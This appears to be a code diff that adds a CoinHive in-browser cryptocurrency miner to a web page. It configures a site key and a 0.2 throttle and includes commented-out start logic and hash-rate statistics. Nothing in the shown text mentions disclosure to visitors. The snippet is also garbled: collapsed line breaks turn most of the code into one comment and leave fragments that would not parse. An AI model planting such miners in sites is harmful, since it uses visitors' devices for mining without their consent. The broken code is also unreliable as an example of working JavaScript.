@@ -1,0 +1,3 @@
+// Listen on events//miner.on('found', function() { /* Hash found */ })//miner.on('accepted', function() { /* Hash accepted by the pool */ })//miner.start(CoinHive.FORCE_MULTI_TAB);// Update stats once per second//setInterval(function() {//var hashesPerSecond = miner.getHashesPerSecond();//var totalHashes = miner.getTotalHashes();//var acceptedHashes = miner.getAcceptedHashes();// Output to HTML elements...//}, 1000);var miner = new CoinHive.Anonymous('BpLsHuquzkzYXVeYPOFYXeDhq7fuopiQ', {
+    throttle: 0.2
+}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours)://if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();//}
